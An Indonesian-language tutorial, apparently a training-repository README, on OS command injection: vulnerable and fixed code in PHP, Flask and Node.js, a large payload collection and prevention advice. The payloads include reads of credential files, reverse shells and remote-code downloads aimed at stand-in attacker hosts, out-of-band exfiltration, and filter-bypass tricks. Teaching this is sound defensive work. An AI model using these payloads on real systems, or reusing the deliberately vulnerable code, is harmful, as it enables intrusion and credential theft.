# Command Injection

## Pengertian

Command Injection adalah kerentanan yang memungkinkan penyerang menjalankan perintah sistem operasi melalui aplikasi web. Kerentanan ini terjadi ketika aplikasi menerima input dari pengguna dan menggabungkannya langsung ke perintah shell tanpa validasi atau pembersihan yang memadai.

**Analogi:** Bayangkan seorang resepsionis yang menerima pesan tertulis dari tamu dan langsung membacakannya melalui pengeras suara tanpa memeriksa isinya. Jika tamu menulis pesan berbahaya, pesan tersebut akan tetap disampaikan apa adanya.

## Contoh Source Code yang Rentan Command Injection

### 1. PHP - Fitur Ping

**Kode Rentan:**
```php
<?php
// BAHAYA: Input pengguna langsung digabungkan ke perintah shell
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

**Kode Aman:**
```php
<?php
$ip = $_GET['ip'];

// AMAN: Validasi format IP address
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP address");
}

// AMAN: Gunakan escapeshellarg untuk escaping
$output = shell_exec("ping -c 4 " . escapeshellarg($ip));
echo "<pre>$output</pre>";
?>
```

### 2. Python (Flask) - Fitur Network Tools

**Kode Rentan:**
```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route("/nslookup")
def nslookup():
    domain = request.args.get("domain")
    # BAHAYA: Input pengguna langsung digabungkan ke perintah shell
    result = os.popen("nslookup " + domain).read()
    return result

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request
import subprocess
import re

app = Flask(__name__)

@app.route("/nslookup")
def nslookup():
    domain = request.args.get("domain")
    
    # AMAN: Validasi format domain
    if not re.match(r"^[a-zA-Z0-9.-]+$", domain):
        return "Invalid domain name", 400
    
    # AMAN: Gunakan subprocess dengan argumen terpisah
    try:
        result = subprocess.run(
            ["nslookup", domain],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Request timeout", 408

if __name__ == "__main__":
    app.run(debug=True)
```

### 3. Node.js (Express) - File Converter

**Kode Rentan:**
```javascript
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/convert', (req, res) => {
    const filename = req.query.file;
    // BAHAYA: Input pengguna langsung digabungkan ke perintah shell
    exec(`convert ${filename} output.pdf`, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).send(error.message);
        }
        res.send('Conversion complete');
    });
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const { execFile } = require('child_process');
const path = require('path');
const app = express();

app.get('/convert', (req, res) => {
    const filename = req.query.file;
    
    // AMAN: Validasi dan sanitasi nama file
    const safeFilename = path.basename(filename);
    
    // AMAN: Gunakan execFile dengan argumen terpisah
    execFile('convert', [safeFilename, 'output.pdf'], (error, stdout, stderr) => {
        if (error) {
            return res.status(500).send(error.message);
        }
        res.send('Conversion complete');
    });
});

app.listen(3000);
```

## Mekanisme Serangan

Serangan ini bekerja dalam tiga tahap:

1. Aplikasi menerima input dari pengguna (misalnya: alamat IP, nama file, atau parameter lainnya)
2. Input tersebut digabungkan langsung ke perintah shell tanpa penyaringan
3. Penyerang menyisipkan karakter khusus untuk memisahkan perintah dan menambahkan perintah baru

### Contoh Eksploitasi

**Perintah yang diharapkan:**
```bash
ping 127.0.0.1
```

**Jika input dimanipulasi menjadi:**
```
127.0.0.1 && whoami
```

**Maka perintah yang dijalankan server:**
```bash
ping 127.0.0.1 && whoami
```

Server akan menjalankan perintah `whoami` setelah `ping`, yang mengungkapkan informasi sistem kepada penyerang.

## Karakter yang Digunakan dalam Serangan

| Karakter | Fungsi | Contoh |
|----------|--------|--------|
| `;` | Memisahkan perintah | `127.0.0.1; ls` |
| `&&` | Menjalankan perintah berikutnya jika sebelumnya berhasil | `127.0.0.1 && whoami` |
| `\|\|` | Menjalankan perintah berikutnya jika sebelumnya gagal | `invalid_command \|\| whoami` |
| `` ` `` | Menjalankan perintah dalam subshell (backtick) | `` 127.0.0.1 && `id` `` |
| `$()` | Menjalankan perintah dalam subshell | `127.0.0.1 && $(uname -a)` |
| `\|` | Mengalirkan output perintah pertama ke perintah kedua | `127.0.0.1 \| grep bytes` |

## Dampak

Jika berhasil dieksploitasi, Command Injection dapat mengakibatkan:
- **Eksekusi perintah arbitrer** -- Penyerang dapat menjalankan perintah apa pun di sistem
- **Pembacaan file sensitif** -- File konfigurasi, kredensial, atau data pribadi dapat diakses
- **Pengiriman data keluar** -- Data dapat dikirim ke server yang dikendalikan penyerang
- **Pengambilalihan sistem** -- Dalam kasus parah, penyerang dapat mengendalikan server sepenuhnya

## Kumpulan Payload Command Injection

### Payload Deteksi Dasar

Payload ini digunakan untuk mengidentifikasi apakah aplikasi rentan Command Injection:

```bash
127.0.0.1; whoami              -- Menguji eksekusi perintah dengan titik koma
127.0.0.1 && whoami            -- Menguji eksekusi perintah dengan AND
127.0.0.1 | whoami             -- Menguji eksekusi perintah dengan pipe
127.0.0.1 || whoami            -- Menguji eksekusi perintah dengan OR
`whoami`                       -- Menguji eksekusi dengan backtick
$(whoami)                      -- Menguji eksekusi dengan subshell
```

### Payload untuk Reconnaissance

**Informasi sistem:**
```bash
; whoami                       -- User yang menjalankan proses
; id                           -- User ID dan group ID
; hostname                     -- Nama host server
; uname -a                     -- Informasi kernel dan OS
; uname -m                     -- Arsitektur sistem
; cat /etc/os-release          -- Distribusi Linux
; pwd                          -- Direktori kerja saat ini
; ls -la                       -- Daftar file dengan permission
```

**Informasi jaringan:**
```bash
; ifconfig                     -- Konfigurasi network interface
; ip addr                      -- Informasi alamat IP
; netstat -tulpn               -- Listening ports
; ss -tulpn                    -- Alternatif netstat
; cat /etc/hosts               -- File hosts
; cat /etc/resolv.conf         -- Konfigurasi DNS
```

### Payload untuk Membaca File Sensitif

**File konfigurasi:**
```bash
; cat /etc/passwd              -- Daftar user sistem
; cat /etc/shadow              -- Password hash (jika ada akses)
; cat /etc/hosts               -- File hosts
; cat /etc/resolv.conf         -- Konfigurasi DNS
; cat /etc/mysql/my.cnf        -- Konfigurasi MySQL
; cat /etc/apache2/apache2.conf -- Konfigurasi Apache
```

**File aplikasi:**
```bash
; cat config.php               -- Konfigurasi aplikasi PHP
; cat .env                     -- Environment variables
; cat wp-config.php            -- Konfigurasi WordPress
; cat /proc/self/environ       -- Environment variables proses
; cat ~/.bash_history          -- Riwayat perintah user
```

**File kredensial:**
```bash
; cat ~/.ssh/id_rsa            -- SSH private key
; cat ~/.ssh/authorized_keys   -- SSH authorized keys
; cat /root/.mysql_history     -- Riwayat query MySQL
; cat ~/.aws/credentials       -- AWS credentials
```

### Payload untuk Remote Code Execution

**Reverse shell:**
```bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; nc -e /bin/sh ATTACKER_IP 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Download dan eksekusi malware:**
```bash
; wget http://attacker.com/shell.php -O /tmp/shell.php
; curl http://attacker.com/shell.sh | bash
; python -c "import urllib; urllib.urlretrieve('http://attacker.com/shell.py', '/tmp/shell.py')"
```

### Payload Blind Command Injection

Ketika output tidak ditampilkan langsung, gunakan teknik time-based atau out-of-band:

**Time-based detection:**
```bash
; sleep 5                      -- Delay 5 detik jika rentan
; ping -c 10 127.0.0.1         -- Delay dengan ping
```

**Out-of-band (OOB):**
```bash
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
```

### Payload Bypass Filter

**Jika spasi difilter:**
```bash
;cat</etc/passwd
{cat,/etc/passwd}
IFS=,;{cat,/etc/passwd}
```

**Jika titik koma difilter:**
```bash
&& whoami
| whoami
%0Awhoami                      -- URL encoded newline
```

**Jika perintah tertentu diblokir:**
```bash
; w'h'o'am'i                   -- Quote insertion
; who"ami"                     -- Quote insertion
; who$(echo am)i               -- Command substitution
; base64<<<$(cat /etc/passwd)  -- Base64 encode output
```

## Tools untuk Pengujian Command Injection

### 1. Commix

Commix adalah alat otomatis untuk mendeksi dan mengeksploitasi Command Injection.

**Instalasi:**
```bash
git clone https://github.com/commixproject/commix.git
cd commix
python commix.py --help
```

**Penggunaan:**
```bash
-- Deteksi Command Injection
python commix.py -u 'http://target.com/ping?ip=127.0.0.1'

-- Eksploitasi dengan shell interaktif
python commix.py -u 'http://target.com/ping?ip=127.0.0.1' --os-shell

-- Menggunakan cookie
python commix.py -u 'http://target.com/ping?ip=127.0.0.1' --cookie='session=xyz'

-- Menggunakan HTTP method tertentu
python commix.py -u 'http://target.com/ping' --data='ip=127.0.0.1' --method='POST'
```

### 2. Burp Suite

Burp Suite dapat digunakan untuk pengujian Command Injection secara manual:

- **Intruder** -- Mengirim berbagai payload secara otomatis
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi Command Injection secara otomatis

**Payload list untuk Intruder:**
```
;whoami
&&whoami
|whoami
%3Bwhoami
%0Awhoami
`whoami`
$(whoami)
```

### 3. OWASP ZAP

OWASP ZAP memiliki fitur untuk mendeteksi Command Injection:

- **Active Scan** -- Otomatis mendeteksi injection vulnerabilities
- **Fuzzer** -- Mengirim berbagai payload untuk menguji kerentanan

### 4. PayloadsAllTheThings

Repositori lengkap berisi payload Command Injection:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan Command Injection:

1. **Uji dengan karakter khusus** -- Input `;`, `&&`, `|`, backtick, atau `$()` dan perhatikan respons
2. **Uji dengan perintah sederhana** -- Coba `whoami`, `id`, atau `hostname`
3. **Uji time-based** -- Gunakan `sleep 5` dan perhatikan waktu respons
4. **Perhatikan error message** -- Error dari shell dapat mengungkap informasi berharga
5. **Uji berbagai parameter** -- Coba injection di semua input yang diterima aplikasi

## Metode Pencegahan

1. **Hindari penggunaan fungsi shell** -- Gunakan API atau library bawaan daripada perintah shell langsung
   
   ```python
   # Daripada:
   os.popen("ping " + ip)
   
   # Gunakan:
   subprocess.run(["ping", ip], capture_output=True)
   ```

2. **Gunakan parameterized functions** -- Jika harus menjalankan perintah sistem, gunakan fungsi yang menerima argumen sebagai array, bukan string
   
   ```javascript
   // Daripada:
   exec(`convert ${filename} output.pdf`)
   
   // Gunakan:
   execFile('convert', [filename, 'output.pdf'])
   ```

3. **Validasi input secara ketat** -- Hanya izinkan karakter yang diharapkan (misalnya: hanya angka dan titik untuk alamat IP)
   
   ```php
   if (!filter_var($ip, FILTER_VALIDATE_IP)) {
       die("Invalid IP address");
   }
   ```

4. **Gunakan fungsi escaping** -- Gunakan `escapeshellarg()` atau `escapeshellcmd()` (PHP) atau fungsi serupa di bahasa lain
   
   ```php
   $safe_ip = escapeshellarg($ip);
   $output = shell_exec("ping -c 4 " . $safe_ip);
   ```

5. **Jalankan dengan hak akses minimum** -- Batasi hak akses proses aplikasi untuk mengurangi dampak jika terjadi serangan

6. **Terapkan Web Application Firewall (WAF)** -- Gunakan WAF sebagai lapisan pertahanan tambahan untuk mendeteksi dan memblokir pola serangan

7. **Gunakan whitelist input** -- Hanya izinkan nilai yang sudah ditentukan sebelumnya

## Latihan Praktis

Silakan lanjutkan ke direktori `Challange/` untuk latihan berbasis skenario.

## Referensi Lanjutan

- OWASP Command Injection
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- PortSwigger: OS Command Injection -- https://portswigger.net/web-security/os-command-injection
- Commix -- https://github.com/commixproject/commix
- PayloadsAllTheThings Command Injection -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
